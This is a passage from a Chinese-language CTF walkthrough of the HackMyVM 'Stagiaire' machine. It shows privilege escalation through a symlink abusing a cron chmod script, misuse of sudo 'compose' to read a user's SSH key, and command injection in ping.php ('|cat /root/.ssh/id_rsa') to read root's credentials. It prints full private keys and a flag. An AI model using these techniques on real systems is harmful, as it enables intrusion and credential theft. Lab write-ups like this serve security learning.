drwxrwxrwx 2 paillette paillette 4096 Oct 28  2021 ssh
(remote) www-data@stagiaire.hmv:/home/paillette/tetramin$ cd ssh
(remote) www-data@stagiaire.hmv:/home/paillette/tetramin/ssh$ ls -la
total 12
drwxrwxrwx 2 paillette paillette 4096 Oct 28  2021 .
drwxrwx--- 3 paillette www-data  4096 Oct 31  2021 ..
-rwx------ 1 paillette paillette 2610 Oct 28  2021 id_rsa
```

感觉像是定时任务，尝试进行软链接，使其赋予权限：

```bash
(remote) www-data@stagiaire.hmv:/home/paillette/tetramin$ ln -s ssh/id_rsa paillette
(remote) www-data@stagiaire.hmv:/home/paillette/tetramin$ ls -la
total 12
drwxrwx--- 3 paillette www-data  4096 Aug  8 14:37 .
drwx---r-x 5 paillette paillette 4096 Oct 28  2021 ..
lrwxrwxrwx 1 www-data  www-data    10 Aug  8 14:37 paillette -> ssh/id_rsa
drwxrwxrwx 2 paillette paillette 4096 Oct 28  2021 ssh
(remote) www-data@stagiaire.hmv:/home/paillette/tetramin$ ./../.chmod 
/usr/bin/chmod: changing permissions of 'paillette': Operation not permitted
/usr/bin/chmod: changing permissions of 'ssh': Operation not permitted
(remote) www-data@stagiaire.hmv:/home/paillette/tetramin$ ls -la
total 12
drwxrwx--- 3 paillette www-data  4096 Aug  8 14:37 .
drwx---r-x 5 paillette paillette 4096 Oct 28  2021 ..
lrwxrwxrwx 1 www-data  www-data    10 Aug  8 14:37 paillette -> ssh/id_rsa
drwxrwxrwx 2 paillette paillette 4096 Oct 28  2021 ssh
(remote) www-data@stagiaire.hmv:/home/paillette/tetramin$ cat paillette 
cat: paillette: Permission denied
(remote) www-data@stagiaire.hmv:/home/paillette/tetramin$ cat paillette 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAx7z/nvanBsoQALsFIgZz8YUEGqYp3U1sjh7gU1NtBcIJwn3TvV9Q
bJSMXLKskP2QBskZgz+r8LZ4lOOk5LC95wcFpCimZriXJ73XBPVpfIrgmgiknFeuHNeq6S
FuC8ZwtKXmvpLyhxNo74oUH7UVo2VaKVNosT/DHSlAzVdIvlMPsxD7h/lNVNg44g/wOm/o
6UOdI1QF0FOnc1OW9wyXxJ7uCH/kPBK4Qrh+VLpmSj1O0S3vHSJkEnnT3yJKVVDyNsRMuy
MkeFMBPqOd+h6KwX4Mqt1juUh+yhQNqwQI/gPn9Z8nfFVZpZZWTol+whcQgFx2+TaAE7xn
yb+0tX9MjzVI5zQ/ZvhUSS3/eMjyKUDKY2B+SRMS4zRD4+HNK8ktMIBCWcgQVbrXvcKqCd
Y0Cu3IkoOj7bkpZKMfTQgsD2n7iO6bIDjo8XWQYD6YldzO9kSB4ss6acXPlLAHDiqiC017
YNAUQUOCxGmhknhLs8tMdemCshHuVitR4eR0EBbtAAAFkOG98wjhvfMIAAAAB3NzaC1yc2
EAAAGBAMe8/572pwbKEAC7BSIGc/GFBBqmKd1NbI4e4FNTbQXCCcJ9071fUGyUjFyyrJD9
kAbJGYM/q/C2eJTjpOSwvecHBaQopma4lye91wT1aXyK4JoIpJxXrhzXqukhbgvGcLSl5r
6S8ocTaO+KFB+1FaNlWilTaLE/wx0pQM1XSL5TD7MQ+4f5TVTYOOIP8Dpv6OlDnSNUBdBT
p3NTlvcMl8Se7gh/5DwSuEK4flS6Zko9TtEt7x0iZBJ5098iSlVQ8jbETLsjJHhTAT6jnf
oeisF+DKrdY7lIfsoUDasECP4D5/WfJ3xVWaWWVk6JfsIXEIBcdvk2gBO8Z8m/tLV/TI81
SOc0P2b4VEkt/3jI8ilAymNgfkkTEuM0Q+PhzSvJLTCAQlnIEFW6173CqgnWNArtyJKDo+
25KWSjH00ILA9p+4jumyA46PF1kGA+mJXczvZEgeLLOmnFz5SwBw4qogtNe2DQFEFDgsRp
oZJ4S7PLTHXpgrIR7lYrUeHkdBAW7QAAAAMBAAEAAAGAWDXIslx90UrFnHz7vFYbOEulT1
uY24pI6c8LBOGwIT3bb5CARX7llr5X6sxh17qTs9t2L/ebqLf9MswCU5kWlQQN4rytGGpn
Hv8BCciUKJNws7YjdIRoeYZpjYHdBshBmBY4fGuLPko9KqTRVFt1ze6BzgRvFPBy69r/Kn
BkyOEH6u4SF6/rDhBbtsKRNk2cEABzUlnWI3X+WrlMz5g5InWJ7CkHE9y0kYrHCAY2DI1c
1Jazpis9BMfW4RFUwK75MHdtVFJ/teZcWSd480Qb+rFfzgGljq7mnYbla5S7a08shS5xiS
/2QmQCgJ8mTyK7lXH20Qf0rM0/PrLcA0HjmZRXj20fjAJzVA2w/i1SrL8qrFUIX3n2ykQJ
v1JgO6oumbO1f33BewthnXV6rDLUHR5cG8RRJYeeitf/hGLOSFdET0dSoS0XcXmYAi5H/m
vglyAL4KRIKXwzZyCLvwXykAYjE4q541Ac3OqfT/R5D4yQpJFbQtG/6OiBJoXb0ULlAAAA
wQDWnPqsdXvGbfx+oPEn6FraZO1j6PP0PLGEH/WfvQX0cRTq/YpJmyupjQU+cyOtKnlXxU
u27Mpc4J7GkiULULX2NUVPa6m+638HpT24oT0rlDrjZbhJuYXEGcWeY0vGs0wZGKfAUJcq
uu+ZCRlL/eFN4b9nA1bkn+Or/Hym02GP+Z3iCcETK4hghry/5YnFQctEFSnVclGJsRQh+v
0MCmuQdLA33rN5Job0X9EB2yf5FSKyaodaZZWplufXBssJncAAAADBAPxERzZVFHGPMdRG
JS/WDG4ZvHW7FQw/ffKl721gUPiUn21i3E0zX1pgFtgWs8B8GgZYvUMT3KHz/iY7HiCr/I
Z/icM390YGLX2SgK7w7lFvDJ0Os94AkvfX35vLAxB1GxsW56l3kKnvTdRWg4xUuUGvn5Wq
sNeu2U73n4XyIitD+Rwt8EVeA/j6x7BXAxybQCjS/R2Y1uttEa+hFmfxsOVqgL5tj3ryb6
WY+wBMVwKIO2kw7A4iYgLB7hYaabR9UwAAAMEAyrG246Ilo9eTl6coisRUaUMob+wrzl4o
96XZy07eeE7VJ7y5pLRbp/d8JHeqzJjXrUZw1DXRI8VaFLcGWGpHpRSpKbF65cyy7jw8CV
/bfd4Ke5LAMqNsE/zExKkW2GmbFZy7oLo0iOlnAIrZnxg0OvDTlp9TSQ0iPLBsLsOUdImr
Oex+u1WD/4mfG+Gn/SLALNSwPLw2dP6KsDXJzBKhFWS3WDi0ZUmQUhgJUeo2BWzZOlfqF1
O/Eow/UbO2dlK/AAAAF3BhaWxsZXR0ZUBzdGFnaWFpcmUuaG12AQID
-----END OPENSSH PRIVATE KEY-----
```

上传pspy64看一下：

```bash
# wget http://192.168.10.101:8888/lpspy64
# chmod +x lpspy64
# ./lpspy64
2024/08/08 14:40:28 CMD: UID=0     PID=1      | /sbin/init 
2024/08/08 14:41:01 CMD: UID=0     PID=3577   | /usr/sbin/CRON -f 
2024/08/08 14:41:01 CMD: UID=0     PID=3576   | /usr/sbin/cron -f 
2024/08/08 14:41:01 CMD: UID=0     PID=3578   | /usr/sbin/CRON -f 
2024/08/08 14:41:01 CMD: UID=0     PID=3579   | /usr/sbin/CRON -f 
2024/08/08 14:41:01 CMD: UID=1000  PID=3580   | /bin/sh -c bash /home/madonna/.checkmail 
2024/08/08 14:41:01 CMD: UID=1002  PID=3581   | /bin/sh -c bash /home/paillette/.chmod 
2024/08/08 14:41:01 CMD: UID=1000  PID=3582   | bash /home/madonna/.checkmail 
2024/08/08 14:41:01 CMD: UID=1002  PID=3583   | bash /home/paillette/.chmod 
2024/08/08 14:41:01 CMD: UID=1000  PID=3584   | bash /home/madonna/.checkmail 
2024/08/08 14:41:01 CMD: UID=1000  PID=3585   | bash /home/madonna/.checkmail 
2024/08/08 14:41:01 CMD: UID=1000  PID=3586   | bash /home/madonna/.checkmail 
2024/08/08 14:41:01 CMD: UID=0     PID=3587   | /usr/sbin/CRON -f 
2024/08/08 14:41:01 CMD: UID=1000  PID=3588   | /usr/sbin/sendmail -FCronDaemon -i -B8BITMIME -oem madonna 
```

这么看来之前的sendmail是有机会的。。。。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408082130201.png" alt="image-20240808204311588" style="zoom:50%;" />

### compose提权tony

```bash
paillette@stagiaire:~$ sudo -l
Matching Defaults entries for paillette on stagiaire:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User paillette may run the following commands on stagiaire:
    (tony) NOPASSWD: /usr/bin/compose
```

看一下是个啥：

```bash
paillette@stagiaire:~$ /usr/bin/compose -h
Use: /usr/bin/compose <--action=VAL> [--debug] [MIME-TYPE:[ENCODING:]]FILE [...]

Options:
  action        specify what action to do on these files (default=view)
  debug         be verbose about what's going on
  nopager       ignore any "copiousoutput" directives and never use a "pager"
  norun         just print but don't execute the command (useful with --debug)

Mime-Type:
  any standard mime type designation in the form <class>/<subtype> -- if
  not specified, it will be determined from the filename extension

Encoding:
  how the file (and type) has been encoded (only "gzip", "bzip2,"
  "xz" and "compress" are supported) -- if not specified, it will be
   determined from the filename extension
```

尝试进行提权

```bash
paillette@stagiaire:~$ sudo -u tony /usr/bin/compose norun /home/tony/.ssh/id_rsa

----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAystaOHHt1nHR3fWm7OwdtbTB9UCeBvcSTRXwd+Wc5p+tmkmZgu9h
yyibr5EQoNr8eK5dNJQv6X8fl0tFJ9fNUCQfZOhTvkLo3g0jGZra1n47MTEdK9wli47hid
x1hHBzGcgEWRi9bUytUUkA3oOcU9pXKvtbf16Uucb/tsPbAFb7x3jTw9ivZagFP97/J8Jn
Tq1DYV4UlaC8HY+4UcMw9pu5JtWeHmrsN2/ubdGm7RhY3XEZVOhnDX/Ir5ypRC5EHzsC4q
NT0Xm7CfvCRq7E12D4dzFOuoHM+bSnASAK65q2BkMclwASkzxWZEEUhpBMystZ18jlSwCV
qHS4Ojmd0DuKnjRnEYsWeGKH+Vt5VUaaK7w6qwrdWOgFYJxsoREfGP7UvvMBydaAwvqCan
dVl0hMmLRC9k/r79VV4FyW0nAzFvrBqpD/Jhhl7dCi3ooOsmNgCzQddBChhfPfiGwmdxFF
b35IGwqdLH4f1bU4NsYsYSL94JTcMy4EmeCHwxrtAAAFiCUiaxglImsYAAAAB3NzaC1yc2
EAAAGBAMrLWjhx7dZx0d31puzsHbW0wfVAngb3Ek0V8HflnOafrZpJmYLvYcsom6+REKDa
/HiuXTSUL+l/H5dLRSfXzVAkH2ToU75C6N4NIxma2tZ+OzExHSvcJYuO4YncdYRwcxnIBF
kYvW1MrVFJAN6DnFPaVyr7W39elLnG/7bD2wBW+8d408PYr2WoBT/e/yfCZ06tQ2FeFJWg
vB2PuFHDMPabuSbVnh5q7Ddv7m3Rpu0YWN1xGVToZw1/yK+cqUQuRB87AuKjU9F5uwn7wk
auxNdg+HcxTrqBzPm0pwEgCuuatgZDHJcAEpM8VmRBFIaQTMrLWdfI5UsAlah0uDo5ndA7
ip40ZxGLFnhih/lbeVVGmiu8OqsK3VjoBWCcbKERHxj+1L7zAcnWgML6gmp3VZdITJi0Qv
ZP6+/VVeBcltJwMxb6waqQ/yYYZe3Qot6KDrJjYAs0HXQQoYXz34hsJncRRW9+SBsKnSx+
H9W1ODbGLGEi/eCU3DMuBJngh8Ma7QAAAAMBAAEAAAGAZRucINZUsX1QGG0Yy7kxWt4Dci
bEY06eFkbg/LZDUwy7vlgBrLFzPZpCfPdDph9ojzbIC6XyeWVDN+h0U1gZ6mIIMQRQdGTh
u4wrOuHlR9np4y3MkIiTQ5B6TITZJq32BR2fZVibYTpAk21lfIt7zqbmnOxzgv6CAloANn
xR3UqA/8PzOQr48CMkcuLYrlcTsLtcA9inRK69+7MjP8ikyd98IauRyTKgEUfCRYioxD9G
VynDanzwnF9gjIX8Mp0pv23BhChP9P30TlS+Jyr5d6Y9keNwS+DibdKk+8j9q0Spif7rLD
QK9mQRhC4vaa6st/1cc4vy6jslmp1++PMN94pv+DETS1i+k88S7FGzHtYQ6RNXVuQ5Pmys
j4o7GBOmvP1u9V2eEBKdFij7GSJppIZYqB8H9NB2Ib1byFo4cJbzHfXCSyDrm6Y7oOwCOt
a8nki/oTH0y6FNI84mSgKUdD4eSS0ThQnFAm7oQAnAyY6T6TSHRK7Qyh/BE7wLvqA1AAAA
wEepLMcPsRzwUtvkM+2bvBOsSbZX0ygUEL5XzQgilTXxqRYiwofEuLsH/wPYhW9qyQGGiu
/O3MjiV1Vsv2YyGtq0kNXRAHwZEk271rtnjL9xa9JQAn8c+GY/UiJVGNM6vXGS8SgxhReq
2muSM4ACwqAsxFmseOpHFjIizUC/06NI4xD1sy3IKLldpwRax1MnZ+EzKCmQRNGrRnHo4d
bahq5OcZagR5lmRQnI9tgJSHdWrbfThuESXK9B9f5qYj1KgAAAAMEA+xk7O2mnk59Rvuf8
1DsxsZpUFb35peWnFuZnCYGVhieA0LS6AHsHoXNbCzUVI9GEyzzLIa5eQH1iqYh40neCYL
mvjjcTLNvXCB2V7zckp6EbtNNZ9nCamQY0BjzemEHXjo1Y8h1LsJOBDm7VcIKIeDa88loT
SZ4FyihbrTuz0zOWyFu+dhqt35D7S202n3iGuBOVRGaW0V5PQ7YmatKt0XYgPCWQuNZphh
ctnrucCBO/5FDkLLVMfm3uT2KC0+FXAAAAwQDOwL1B2FtOcKPZDNNuyqkmg8NZsa4ClrFO
sHy66GY15f7+2bj9DRt47RvIHUrDxxs+tkixalIXrqTkJpifsLDy8ovrOodjQSGVeKwolT
POsSFtBzHnIdj9vu4IyLEntj24BkH/PS5rTUDWUhSdBkJAS7mL24+Eo/Yg4oQN3c6s2fk6
UIGokD6j2Ym+rrSj+Oks4859nS2Gx9hbdXdtjdNBy3tDSZL9iHrJrr8D4nu6f0RiHdHFL/
kvgjDq3Ep4Z1sAAAASdG9ueUBzdGFnaWFpcmUuaG12AQ==
-----END OPENSSH PRIVATE KEY-----

┌──(kali💀kali)-[~/temp/Stagiaire1]
└─$ vim tony&&chmod 600 tony&&ssh -i tony tony@192.168.10.104
Load key "tony": error in libcrypto
tony@192.168.10.104's password:
```

发现是复制过来的时候格式出错了手动改一下就行了（头尾。。。）

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408082130202.png" alt="image-20240808210448884" style="zoom:33%;" />

## 命令执行提权root

```bash
tony@stagiaire:~$ ls -la
total 32
drwx------ 4 tony tony 4096 Oct 31  2021 .
drwxr-xr-x 5 root root 4096 Oct 28  2021 ..
lrwxrwxrwx 1 root root    9 Oct 24  2021 .bash_history -> /dev/null
-rw-r--r-- 1 tony tony  220 Oct 24  2021 .bash_logout
-rw-r--r-- 1 tony tony 3526 Oct 24  2021 .bashrc
drwxr-xr-x 3 tony tony 4096 Oct 24  2021 .local
-rw-r--r-- 1 tony tony  807 Oct 24  2021 .profile
drwx------ 2 tony tony 4096 Aug  8 14:49 .ssh
-rwx------ 1 tony tony   33 Oct 24  2021 user.txt
tony@stagiaire:~$ cat user.txt 
2d82acbaf36bbd1b89b9e3794ba90a91
tony@stagiaire:~$ sudo -l
Matching Defaults entries for tony on stagiaire:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User tony may run the following commands on stagiaire:
    (ALL : ALL) NOPASSWD: /bin/bash /srv/php_server
```

看起来像是一个小服务器，执行一下：

```bash
tony@stagiaire:~$ ss -tulnp
Netid              State               Recv-Q              Send-Q                           Local Address:Port                           Peer Address:Port              Process              
udp                UNCONN              0                   0                                      0.0.0.0:68                                  0.0.0.0:*                                      
tcp                LISTEN              0                   80                                   127.0.0.1:3306                                0.0.0.0:*                                      
tcp                LISTEN              0                   128                                    0.0.0.0:22                                  0.0.0.0:*                                      
tcp                LISTEN              0                   100                                    0.0.0.0:25                                  0.0.0.0:*                                      
tcp                LISTEN              0                   511                                          *:80                                        *:*                                      
tcp                LISTEN              0                   128                                       [::]:22                                     [::]:*                                      
tcp                LISTEN              0                   100                                       [::]:25                                     [::]:*                                      
tony@stagiaire:~$ sudo -l
Matching Defaults entries for tony on stagiaire:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User tony may run the following commands on stagiaire:
    (ALL : ALL) NOPASSWD: /bin/bash /srv/php_server
tony@stagiaire:~$ sudo /bin/bash /srv/php_server
[Thu Aug  8 15:07:40 2024] PHP 7.4.21 Development Server (http://127.0.0.1:8000) started
```

运行了一个服务器，看一下有些啥：

```bash
┌──(kali💀kali)-[~/temp/Stagiaire1]
└─$ sudo nmap 192.168.10.104                                                                             
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-08 09:08 EDT
Nmap scan report for stagiaire.hmv (192.168.10.104)
Host is up (0.00053s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
80/tcp open  http
MAC Address: 08:00:27:63:CD:CC (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds
```

发现扫不到，尝试进行转发：

```bash
ssh -L 8001:127.0.0.1:8000 tony@192.168.10.104 -i tony
```

然后就可以扫到了，尝试一下：

```bash
┌──(kali💀kali)-[~/temp/Stagiaire1]
└─$ nmap 0.0.0.0                     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-08 09:15 EDT
Nmap scan report for 0.0.0.0
Host is up (0.00011s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
8001/tcp open  vcom-tunnel
```

可以，扫一下：

```bash
┌──(kali💀kali)-[~/temp/Stagiaire1]
└─$ gobuster dir -u http://0.0.0.0:8001 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -b 301,401,403,404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://0.0.0.0:8001
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404,301,401,403
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/ping.php             (Status: 200) [Size: 0]
===============================================================
Finished
===============================================================
```

fuzz一下是否有相关参数：

```bash
┌──(kali💀kali)-[~/temp/Stagiaire1]
└─$ ffuf -u "http://0.0.0.0:8001/ping.php?FUZZ=127.0.1" -c -w /usr/share/seclists/Discovery/Web-Content/common.txt --fw 1

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://0.0.0.0:8001/ping.php?FUZZ=127.0.1
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1
________________________________________________

ip                      [Status: 200, Size: 433, Words: 52, Lines: 11, Duration: 3109ms]
:: Progress: [4727/4727] :: Job [1/1] :: 1408 req/sec :: Duration: [0:00:06] :: Errors: 3 ::
```

找到参数，尝试执行：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408082130203.png" alt="image-20240808212532558" style="zoom:50%;" />

发现可以执行系统命令：

```bash
http://0.0.0.0:8001/ping.php?ip=127.0.0.1|whoami
```

尝试取出`root`的`id_rsa`：

```bash
http://0.0.0.0:8001/ping.php?ip=127.0.0.1|cat+/root/.ssh/id_rsa
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408082130204.png" alt="image-20240808212822777" style="zoom:50%;" />

拿到的东西尝试登录：

```bash
root@stagiaire:~# ls -la
total 32
drwx------  4 root root 4096 Oct 30  2021 .
drwxr-xr-x 18 root root 4096 Oct 16  2021 ..
lrwxrwxrwx  1 root root    9 Oct 24  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
drwxr-xr-x  3 root root 4096 Oct 28  2021 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rwx--x--x  1 root root   33 Oct 24  2021 root.txt
-rw-r--r--  1 root root   66 Oct 24  2021 .selected_editor
drwx------  2 root root 4096 Oct 28  2021 .ssh
root@stagiaire:~# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
```

## 参考

https://nepcodex.com/2021/11/stagiaire-writeup-hackmyvm-walkthrough/

https://28right.blogspot.com/2021/11/hackmyvm-stagiaire.html

https://www.bilibili.com/video/BV1ez421X7Gr/

